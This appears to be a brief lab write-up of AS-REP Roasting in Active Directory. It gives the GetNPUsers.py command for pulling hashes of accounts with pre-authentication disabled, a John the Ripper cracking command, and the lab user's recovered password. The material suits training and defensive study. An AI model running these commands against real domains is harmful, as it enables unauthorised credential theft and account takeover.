# AS‑REP Roasting in Active Directory

## 🔍 Technique Overview

AS‑REP Roasting is a credential‑access technique where an attacker requests an AS‑REP (Authentication Service Response) for accounts that do **not** require Kerberos pre‑authentication, then cracks the encrypted portion offline to recover cleartext passwords.

- **MITRE ATT&CK ID:** [T1558.004 – AS‑REP Roasting](https://attack.mitre.org/techniques/T1558/004/)  
- **Tools Used:** GetNPUsers.py, John The Ripper

---

## 🏗️ Lab Misconfiguration

The user **Lucy** was configured with:

- **Pre‑authentication disabled** ('RequiresPreAuth' flag cleared)  
- A **weak password** ('$monique$1991$')  
- Member of **Domain Users** only

> In many environments, high‑value service or user accounts are left vulnerable by disabling pre‑authentication for legacy support or convenience.

---

## 🚨 Exploitation Steps

1. **Enumerate AS‑REP‑Roastable Users**  
  ```bash
    GetNPUsers.py mydomain.com/ -no-pass -usersfile users -dc-ip 10.10.1.200
  ```

2. **Crack the Hash Offline**
  ```bash
    john -w:/usr/share/wordlists/rockyou.txt hash
  ```
Recovered password: $monique$1991$

## Impact
Compromise of a domain user account without needing any prior credentials.

Once cracked, attacker can authenticate as that user and escalate further.

Often used as a low‑touch initial foothold in large AD environments.
